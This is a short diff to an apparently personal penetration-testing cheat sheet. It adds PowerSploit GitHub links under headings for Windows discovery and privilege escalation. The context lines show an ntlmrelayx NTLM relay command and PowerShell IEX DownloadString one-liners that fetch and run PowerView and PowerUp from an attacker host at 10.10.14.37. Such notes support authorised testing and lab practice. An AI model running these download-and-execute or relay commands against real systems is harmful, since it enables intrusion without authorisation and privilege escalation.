@@ -339,6 +339,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 # Discovery
 ## Windows
 ### PowerView
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```powershell
 cd /usr/share/windows-resources/powersploit/Recon/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
@@ -355,6 +356,7 @@ iwr -Uri http:// -Outfile winPEAS.bat
 # Privilege Escalation
 ## Windows
 ### PowerUp
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 ```powershell
 cd /usr/share/windows-resources/powersploit/Privesc/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')
